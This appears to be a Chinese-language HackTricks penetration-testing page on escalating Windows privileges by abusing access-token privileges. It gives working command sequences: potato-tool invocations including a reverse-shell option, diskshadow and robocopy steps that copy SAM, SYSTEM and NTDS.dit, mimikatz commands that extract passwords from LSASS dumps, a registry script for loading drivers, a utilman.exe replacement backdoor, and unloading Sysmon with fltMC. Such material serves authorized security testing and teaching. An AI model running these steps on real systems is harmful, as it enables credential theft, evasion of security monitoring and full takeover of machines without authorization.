# 滥用令牌

{{#include ../../banners/hacktricks-training.md}}

## 令牌

如果你**不知道什么是 Windows Access Token**，请先阅读此页面：


{{#ref}}
access-tokens.md
{{#endref}}

**你或许可以通过滥用自己已持有的令牌来提升权限。**

### SeImpersonatePrivilege

此权限允许进程在能够获取令牌句柄时模拟该令牌（但不能创建令牌）。可以通过诱使 Windows 服务（DCOM）对某个 exploit 执行 NTLM 身份验证来获取特权令牌，随后便可使用 SYSTEM 权限执行进程。<sup>[[2]](#references)</sup> 可以使用 [JuicyPotato](https://github.com/ohpe/juicy-potato)、[RogueWinRM](https://github.com/antonioCoco/RogueWinRM)（要求禁用 WinRM）、[SweetPotato](https://github.com/CCob/SweetPotato) 和 [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) 等工具利用这一原语。

如果本地用户能够访问一个经过身份验证的端点，而该端点会以更高权限身份向调用者指定的 URL 发出请求，那么仅限 loopback 访问的 Web 应用也可能提供另一个诱导线索。检查该端点的授权和 URL 限制、实际的出站客户端身份及身份验证行为，以及该客户端是否能够访问由低权限用户控制的 listener。仅凭启用的 `SeImpersonatePrivilege`、IIS listener 或 URL-fetch 参数，无法证明存在特权令牌或权限提升路径。进行此项检查时请保持被动；枚举期间不要发送诱导请求。请参阅 Microsoft 关于 [client impersonation](https://learn.microsoft.com/en-us/windows/win32/secauthz/client-impersonation) 和 [IIS application-pool identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) 的文档。

现代 operator 注意事项：

- **JuicyPotato 已过时**：在 Windows 10 1809+/Server 2019+ 上，根据仍可访问的 RPC/COM 接口，优先使用 **GodPotato**、**SigmaPotato**、**PrintNotifyPotato**、**RoguePotato**、**SharpEfsPotato/EfsPotato** 或 **PrintSpoofer**。
- 如果你攻陷了以 **`LOCAL SERVICE`** 或 **`NETWORK SERVICE`** 身份运行的服务，并且 `whoami /priv` 显示的是缺少 `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege` 的**受限令牌**，请先恢复该账户的**默认权限集**（例如使用 **FullPowers**），然后再尝试 potato 系列工具。<sup>[[3]](#references)</sup>
- 一些较新的 fork 比原始工具更便于 operator 使用。例如，**SigmaPotato** 支持反射式/内存中执行和现代 Windows 兼容性，而 **PrintNotifyPotato** 利用 PrintNotify COM 服务；当经典 Spooler 路径被禁用时，它通常很有用。

```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

它与 **SeImpersonatePrivilege** 非常相似，会使用**相同的方法**获取特权 token。\
然后，此权限允许将**主 token 分配**给新进程或挂起的进程。借助特权模拟 token，你可以派生出一个主 token（DuplicateTokenEx）。\
获得 token 后，你可以使用 'CreateProcessAsUser' 创建**新进程**，也可以创建挂起进程并为其**设置 token**（通常无法修改正在运行的进程的主 token）。<sup>[[2]](#references)</sup>

### SeTcbPrivilege

如果启用了此 token，你可以使用 **KERB_S4U_LOGON** 获取任意其他用户的**模拟 token**，而无需知道其凭据；向 token 中**添加任意组**（如 admins）；设置 token 的**完整性级别**为 "**medium**"；并将此 token 分配给**当前线程**（SetThreadToken）。<sup>[[2]](#references)</sup>

### SeBackupPrivilege

此权限会使系统对任何文件**授予所有读取访问权限**（仅限读取操作）。它可用于从注册表中**读取本地 Administrator 账户的密码哈希**，随后可使用 "**psexec**" 或 "**wmiexec**" 等工具配合该哈希执行操作（Pass-the-Hash 技术）。不过，在以下两种情况下，此技术会失效：Local Administrator 账户已禁用，或者有策略会移除从远程连接的 Local Administrators 的管理权限。<sup>[[2]](#references)</sup>\
实际上，最可靠的内置流程通常是 **VSS + `robocopy /b`**：创建或公开卷影副本，然后在**备份模式**下复制 `SAM`/`SYSTEM` 或 `NTDS.dit`，以绕过文件 ACL。<sup>[[4]](#references)</sup>

```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```

You 可以**滥用此权限**，使用：

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- 跟着 **IppSec** 学习：[https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- 或者参照以下内容中 **使用 Backup Operators 提升权限**一节的说明：


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

此权限允许**写入**任何系统文件，无论该文件的访问控制列表（ACL）如何。它提供了许多提权可能性，包括**修改服务**、执行 DLL Hijacking，以及通过 Image File Execution Options 设置**调试器**等技术。<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

SeCreateTokenPrivilege 是一项强大的权限，尤其适用于用户能够模拟令牌的情况；即使没有 SeImpersonatePrivilege，这项权限也很有用。此能力取决于能否模拟代表同一用户、且完整性级别不高于当前进程的令牌。<sup>[[2]](#references)</sup>

**要点：**

- **无需 SeImpersonatePrivilege 即可进行模拟：**在特定条件下，可以利用 SeCreateTokenPrivilege 通过模拟令牌实现 EoP。
- **令牌模拟的条件：**目标令牌必须属于同一用户，且其完整性级别必须低于或等于尝试进行模拟的进程的完整性级别，才能成功模拟。
- **创建和修改模拟令牌：**用户可以创建模拟令牌，并通过添加特权组的 SID（安全标识符）来提升其权限。

### SeLoadDriverPrivilege

此权限允许进程通过创建包含特定 `ImagePath` 和 `Type` 值的注册表项来**加载和卸载设备驱动程序**。由于无法直接写入 `HKLM`（HKEY_LOCAL_MACHINE），可以改用 `HKCU`（HKEY_CURRENT_USER）。不过，需要使用特定路径，才能让内核将 `HKCU` 项识别为驱动程序配置。<sup>[[2]](#references)</sup>

现代攻击中通常采用 **BYOVD**（自带易受攻击的驱动程序）：加载一个**已签名但存在漏洞的**内核驱动程序，然后利用其 IOCTL 禁用保护机制或跳转到内核代码执行。请注意，在较新的 Windows 11/Server 版本中，**Microsoft 易受攻击驱动程序阻止列表**和/或 **HVCI/内存完整性**通常会使较早的公开攻击链失效，因此，经典的 `szkg64.sys` 风格示例不再普遍可靠。

此路径为 `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`，其中 `<RID>` 是当前用户的相对标识符。在 `HKCU` 中，必须创建整个路径，并设置两个值：<sup>[[2]](#references)</sup>

- `ImagePath`，即要执行的二进制文件的路径
- `Type`，值为 `SERVICE_KERNEL_DRIVER`（`0x00000001`）。

**操作步骤：**

1. 由于写入权限受限，使用 `HKCU`，而不是 `HKLM`。
2. 在 `HKCU` 中创建路径 `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`，其中 `<RID>` 表示当前用户的相对标识符。
3. 将 `ImagePath` 设置为二进制文件的执行路径。
4. 将 `Type` 设为 `SERVICE_KERNEL_DRIVER`（`0x00000001`）。

```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```

更多滥用此权限的方法见 [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

这与 **SeRestorePrivilege** 类似。它的主要作用是允许进程**取得对象的所有权**，从而绕过必须通过授予 WRITE_OWNER 访问权限来获得明确自主访问权限的要求。此过程首先取得目标注册表项的所有权以便进行写入，然后修改 DACL 以允许写入操作。<sup>[[2]](#references)</sup>

```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```

### SeDebugPrivilege

此权限允许**调试其他进程**，包括读取和写入其内存。利用此权限可以采用各种内存注入策略，规避大多数 antivirus 和主机入侵防御解决方案。<sup>[[2]](#references)</sup>

在现代 Windows 上，请记住，`SeDebugPrivilege` 通常足以打开**非受保护的 SYSTEM 进程**并复制其 token，但**不**保证你能访问 **LSASS**。如果启用了 **RunAsPPL / LSA Protection**，即使具有 `SeDebugPrivilege`，非受保护进程也无法读取或注入 LSASS。在这种情况下，应从其他非 PPL 的 SYSTEM 进程窃取 token，或结合使用 PPL bypass/BYOVD，而不要想当然地认为 `procdump` 一定能用。有关使用 `SeDebugPrivilege` + `SeImpersonatePrivilege` 复制 token 的完整示例，请查看[此页面](sedebug-+-seimpersonate-copy-token.md)。

#### 转储内存

你可以使用 [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) 中的 [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) 来**捕获进程的内存**。具体来说，可以用于 **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)** 进程，该进程负责在用户成功登录系统后存储用户凭据。

随后，你可以将此转储加载到 mimikatz 中以获取密码：

```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

之前保存的、可读取的 LSASS dump 可能可用，即使当前帐户无权捕获受保护的实时进程。仅将 dump 文件或名称相似的存档视为线索：先验证是否有权访问及其内容，再评估其中恢复的凭据是否仍然有效，以及是否能授予更高权限的上下文。仅凭文件名无法证明存档中包含 dump，也无法证明凭据可重复使用。

#### RCE

如果想获取 `NT SYSTEM` shell，可以使用：

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)

```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```

### SeManageVolumePrivilege

此权限（执行卷维护任务）可支持特权卷操作，但本身并不能保证能够获取可读的原始卷句柄或任意文件访问权限。设备 ACL、令牌状态、Windows 版本以及请求执行的操作仍会产生影响。获准执行的卷控制操作也可能会更改文件系统 ACL；这属于会修改数据且可能影响整个卷的操作。在 CA 主机上，滥用证书还需要能够访问可用的私钥材料；访问 EFS 保护的文件仍需要授权的解密密钥或恢复密钥。请参阅下文的详细前提条件。<sup>[[5]](#references)</sup>

请参阅详细技术和缓解措施：

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## 检查权限

```
whoami /priv
```

**显示为 Disabled 的令牌**通常可以启用，因此你通常可以滥用 _Enabled_ 和 _Disabled_ 两种权限。

### 启用所有令牌

如果你有已禁用的权限，可以使用脚本 [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) 启用所有令牌：

```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```

或者是这篇[**文章**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/)中嵌入的 **script**。

## 表格

完整的 token privileges 速查表见 [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)，下面的摘要仅列出可直接利用这些权限来获取管理员会话或读取敏感文件的方法。<sup>[[1]](#references)</sup>

| 权限                       | 影响        | 工具                    | 执行路径                                                                                                                                                                                                                                                                                                                                     | 备注                                                                                                                                                                                                                                                                                                                        |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**管理员**_ | 第三方工具          | _"它允许用户模拟 token，并使用 potato.exe、rottenpotato.exe 和 juicypotato.exe 等工具将权限提升至 nt system"_                                                                                                                                                                                                      | 感谢 [Aurélien Chalot](https://twitter.com/Defte_) 提供更新。我会尽快尝试将其改写成更像操作步骤的形式。                                                                                                                                                                                         |
| **`SeBackup`**             | **威胁**  | _**内置命令**_ | 使用 `robocopy /b` 或专用的、支持 SeBackup 的复制工具读取敏感文件。                                                                                                                                                                                                                                                                 | <p>- 适用于 `SAM`/`SYSTEM`、`SECURITY`、`NTDS.dit`，有时也适用于 `%WINDIR%\MEMORY.DMP`。<br><br>- `robocopy` 使用方便，但专用的 SeBackup cmdlet/API 通常更适合复制已锁定或打开的文件。</p>                                                                                                   |
| **`SeCreateToken`**        | _**管理员**_ | 第三方工具          | 使用 `NtCreateToken` 创建包含本地管理员权限的任意 token。                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**管理员**_ | **PowerShell**          | 复制一个**非 PPL** SYSTEM token，或转储非受保护进程的内存。                                                                                                                                                                                                                                                                 | <p>如果启用了 RunAsPPL/LSA Protection，通常会阻止转储 LSASS。</p><p>脚本见 [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**管理员**_ | 第三方工具          | 使用 **Potato family** / named-pipe impersonation 来启动 SYSTEM（`PrintSpoofer`、`RoguePotato`、`GodPotato`、`SigmaPotato`、`PrintNotifyPotato` 等）。                                                                                                                                                                                    | <p>在 IIS APPPOOL、MSSQL、计划任务等服务账户下，或任何已拥有 `SeImpersonatePrivilege` 的上下文中，这种方法最实用。</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**管理员**_ | 第三方工具          | <p>1. 加载已签名但存在漏洞的内核驱动（BYOVD）<br>2. 使用该驱动的 IOCTL 获取内核读写权限、禁用安全工具或提升至 SYSTEM<br><br>或者，也可以使用内置命令 <code>fltMC</code> 卸载与安全相关的驱动，例如 <code>fltMC sysmondrv</code></p>                     | <p>在现代 Windows 上，易受攻击驱动程序阻止列表 / HVCI 越来越多地拦截 <code>szkg64.sys</code> 等较早公开的驱动程序。</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**管理员**_ | **PowerShell**          | <p>1. 启动已启用 SeRestore 权限的 PowerShell/ISE。<br>2. 使用 <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>) 启用该权限。<br>3. 将 utilman.exe 重命名为 utilman.old<br>4. 将 cmd.exe 重命名为 utilman.exe<br>5. 锁定控制台并按 Win+U</p> | <p>某些 AV 软件可能会检测到此攻击。</p><p>另一种方法是利用相同权限替换存储在 "Program Files" 中的服务二进制文件。</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**管理员**_ | _**内置命令**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. 将 cmd.exe 重命名为 utilman.exe<br>4. 锁定控制台并按 Win+U</p>                                                                                                                                       | <p>某些 AV 软件可能会检测到此攻击。</p><p>另一种方法是利用相同权限替换存储在 "Program Files" 中的服务二进制文件。</p>                                                                                                                                                           |
| **`SeTcb`**                | _**管理员**_ | 第三方工具          | <p>操纵 token，使其包含本地管理员权限。可能需要 SeImpersonate。</p><p>尚待验证。</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- [1] [gtworek/Priv2Admin - 从 Windows 权限到管理员权限的利用路径](https://github.com/gtworek/Priv2Admin)
- [2] [滥用 Token Privileges 进行 LPE](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – 还我权限！好吗？](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – Robocopy（`/b` 备份模式可绕过文件/文件夹 ACL 检查）](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – 执行卷维护任务（SeManageVolumePrivilege）](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB：Certificate（SeManageVolumePrivilege → CA key 外传 → Golden Certificate）](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)
{{#include ../../banners/hacktricks-training.md}}
